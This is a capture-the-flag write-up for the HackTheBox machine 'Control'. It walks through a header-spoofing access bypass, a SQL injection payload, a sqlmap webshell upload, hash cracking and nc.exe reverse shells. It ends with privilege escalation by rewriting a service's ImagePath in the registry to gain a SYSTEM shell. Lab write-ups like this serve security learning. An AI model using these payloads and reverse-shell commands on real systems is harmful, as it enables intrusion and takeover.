---
title: "HTB: Control"
categories:
  - HackTheBox
tags:
  - HackTheBox
---

![Control](https://miro.medium.com/max/2866/0*VVgNDHYF1kz8pziK)

# Control

[[toc]]

## Website Enumeration

In the source code of the index page for http://control.htb/ we see the following message:
```
<!-- To Do:
	- Import Products
	- Link to new payment system
	- Enable SSL (Certificates location \\192.168.4.28\myfiles)
<!-- Header -->
```

We'll keep this in mind for later.

At http://control.htb/admin.php there's a blank page with the message:

_Access Denied: Header Missing. Please ensure you go through the proxy to access this page_

To bypass this, we'll use the IP we grabbed above and add an X-Forwarded-For header:

```
X-Forwarded-For: 192.168.4.28
```

So, our entire request will look like:

```
GET /admin.php HTTP/1.1

Host: control.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.4.28/
X-Forwarded-For: 192.168.4.28
Connection: close
Upgrade-Insecure-Requests: 1
```

We're given access to the admin.php page!


test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,load_file('C:/inetpub/wwwroot/admin.php')#

## Getting a Webshell/Reverse Shell

It's possible to upload a webshell using sqlmap:

```
sqlmap -r request.txt --file-dest="C:/inetpub/wwwroot/wolfshell.php" --file-write="wolfshell.php"
```

Using this "wolfshell" we are able to upload nc.exe to the server, and return a reverse shell to ourselves.

## Getting User Credentials

By dumping the DB, we found some credentials for users:

```
0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
0A4A5CAD344718DC418035A1F4D292BA603134D8
```

If we run these through hashcat, we can get a password!

```
hashcat -m 300 cracked.txt /usr/share/wordlists/rockyou.txt --force
```

We get:

**l33th4x0rhector**

So, our credentials are:

**hector:l33th4x0rhector**

## Pivoting to Hector

Now, using switch.ps1, we are able to open a semi-interactive shell as hector. First, we'll need to give him access to run nc.exe:

```
cacls C:/TEMP/nc.exe /e /p hector:f
```

Now, after uploading our switch.ps1 shell, we can run it:

```
./switch.ps1
[localhost]: PS C:\Users\Hector\Documents> C:/TEMP/nc.exe -nv 10.10.14.26 4444 -e cmd.exe
```

Voila, a fully interactive user cmd shell!

### Switch.ps1 Script

```
function switch-psuser {

    Param(
        [Parameter(Position=0)]
        [ValidateSet("adminsystem","administrator")]
        $User = "adminsystem"
    )

    switch($User)
    {
        'adminsystem'   { $username = "domain\adminsystem" ; $pw = "yyy"}
        'administrator' { $username = "control\hector" ; $pw = "l33th4x0rhector" }
    }

    $password = $pw | ConvertTo-SecureString -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password
    New-PSSession -Credential $cred | Enter-PSSession
}
switch-psuser administrator
```
                                         
Voila, a CONTROL\hector shell!

From here, we need to see what services are running. We can't use accesschk.exe, as we get "Access Denied" and we can't use procmon.exe, as it's completely blocked on the machine. Additionally, we can't use tasklist to list running tasks and get info that way. We can, however, query the registry.

```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\
```

We get a LONG list of services.

We can test to see which of these we can start (note, there are quite a few.) We'll need to copy all of the services, save the list on our local machine, and cut it. 

```
cat services.txt | cut -d '\' -f5 >> servicelist.txt
```

From here, we can use awk to add whatever we need to:

```
awk '{print "sc start " $0}' servicelist.txt | pbcopy
```

I've opted to use pbcopy for this, but we can use whatever program we wish to. We're simply piping the output into our clipboard.

Now, we'll paste this into our command window. Note, it needs to be cmd, not powershell. Powershell doesn't start or stop the services.

We can see that the following service can be started (among others):

```
NetSetupSvc
```

Because it can be started, we'll take a look at the parameters held within the registry for this service:

```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetSetupSvc

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetSetupSvc
    DependOnService    REG_MULTI_SZ    RpcSs
    Description    REG_SZ    @%SystemRoot%\system32\NetSetupSvc.dll,-4
    DisplayName    REG_SZ    @%SystemRoot%\system32\NetSetupSvc.dll,-3
    ErrorControl    REG_DWORD    0x1
    FailureActions    REG_BINARY    FFFFFFFF000000000000000001000000140000000000000000000000
    ImagePath    REG_EXPAND_SZ    %SystemRoot%\System32\svchost.exe -k netsvcs -p
    ObjectName    REG_SZ    LocalSystem
    RequiredPrivileges    REG_MULTI_SZ    SeChangeNotifyPrivilege\0SeImpersonatePrivilege\0SeLoadDriverPrivilege
    ServiceSidType    REG_DWORD    0x1
    Start    REG_DWORD    0x3
    Type    REG_DWORD    0x20

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetSetupSvc\Parameters
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetSetupSvc\Security
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetSetupSvc\TriggerInfo
```

ImagePath looks interesting, as it's calling an executable and passing parameters to it. We'll edit this and see if we can get it to return a shell to us:

```
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetSetupSvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\alcibiades\Documents\nc.exe -nv 10.10.14.5 4444 -e cmd.exe"  /f
```

With the ImagePath changed, we'll try to start the service with hector:

```
sc start NetSetupSvc
```

Now, we just catch the shell!

```
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```



